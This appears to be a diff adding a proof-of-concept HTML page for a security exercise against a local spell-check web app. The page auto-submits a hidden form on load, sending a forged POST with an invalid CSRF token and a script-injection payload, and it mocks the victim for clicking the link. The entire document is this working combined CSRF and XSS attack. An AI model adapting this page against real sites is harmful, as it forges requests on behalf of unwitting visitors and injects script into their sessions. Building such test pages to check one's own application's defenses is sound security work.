@@ -1,0 +1,13 @@
+   <html>
+ 
+   <P> Should you have clicked that link?? :) </P>
+
+   <body onload="document.forms[0].submit()">
+      <form action="http://127.0.0.1:5000/spell_check" method="POST">
+        <input type="hidden" name="inputtext" value="<script> alert('XSS') </script>"/>
+        <input type="hidden" name="csrf_token" value="GARBAGE" />
+        <input type="submit" value="submit" />
+      </form>
+    </body>
+
+   </html>
